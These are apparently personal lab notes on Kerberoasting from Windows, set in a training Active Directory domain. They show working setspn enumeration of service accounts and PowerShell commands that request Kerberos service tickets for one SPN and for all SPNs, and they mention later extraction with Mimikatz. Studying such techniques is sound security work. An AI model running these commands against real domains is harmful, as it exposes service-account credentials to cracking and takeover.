Kerberoasting - from Windows
#############################

Date: 2024-12-26 11:42:19

Status: #new

Tags: :ref:`active directory enumeration attacks`

Description
*************

:ref:`kerberoasting - from linux`


Kerberoasting - Semi Manual method
***********************************

.. code-block:: console

    C:\htb> setspn.exe -Q */*

    Checking domain DC=INLANEFREIGHT,DC=LOCAL
    CN=ACADEMY-EA-DC01,OU=Domain Controllers,DC=INLANEFREIGHT,DC=LOCAL
            exchangeAB/ACADEMY-EA-DC01
            exchangeAB/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
            TERMSRV/ACADEMY-EA-DC01
            TERMSRV/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
            Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
            ldap/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/ForestDnsZones.INLANEFREIGHT.LOCAL
            ldap/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DomainDnsZones.INLANEFREIGHT.LOCAL

    <SNIP>

    CN=BACKUPAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
            backupjob/veam001.inlanefreight.local
    CN=SOLARWINDSMONITOR,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
            sts/inlanefreight.local

    <SNIP>


    CN=sqlprod,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
            MSSQLSvc/SPSJDB.inlanefreight.local:1433
    CN=sqlqa,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
            MSSQLSvc/SQL-CL01-01inlanefreight.local:49351
    CN=sqldev,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
            MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433
    CN=adfs,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
            adfsconnect/azure01.inlanefreight.local

    Existing SPN found!

By using PowerShell, we can request TGS tickets for an account in the shell above and 
load them into memory. Once they are loaded into memory, we can extract them using Mimikatz.

Let's try this by targeting a single user:

Targeting a Single User
************************

.. code-block:: powershell

    PS C:\htb> Add-Type -AssemblyName System.IdentityModel
    PS C:\htb> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"

    Id                   : uuid-67a2100c-150f-477c-a28a-19f6cfed4e90-2
    SecurityKeys         : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKey}
    ValidFrom            : 2/24/2022 11:36:22 PM
    ValidTo              : 2/25/2022 8:55:25 AM
    ServicePrincipalName : MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433
    SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey

Retrieving All Tickets Using setspn.exe
****************************************

.. code-block:: powershell

    PS C:\htb> setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }

    Id                   : uuid-67a2100c-150f-477c-a28a-19f6cfed4e90-3
    SecurityKeys         : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKey}
    ValidFrom            : 2/24/2022 11:56:18 PM
    ValidTo              : 2/25/2022 8:55:25 AM
    ServicePrincipalName : exchangeAB/ACADEMY-EA-DC01
    SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey

    Id                   : uuid-67a2100c-150f-477c-a28a-19f6cfed4e90-4
    SecurityKeys         : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKey}
    ValidFrom            : 2/24/2022 11:56:18 PM
    ValidTo              : 2/24/2022 11:58:18 PM
    ServicePrincipalName : kadmin/changepw
    SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey

    Id                   : uuid-67a2100c-150f-477c-a28a-19f6cfed4e90-5
    SecurityKeys         : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKey}
    ValidFrom            : 2/24/2022 11:56:18 PM
    ValidTo              : 2/25/2022 8:55:25 AM
    ServicePrincipalName : WSMAN/ACADEMY-EA-MS01
    SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey

    <SNIP>

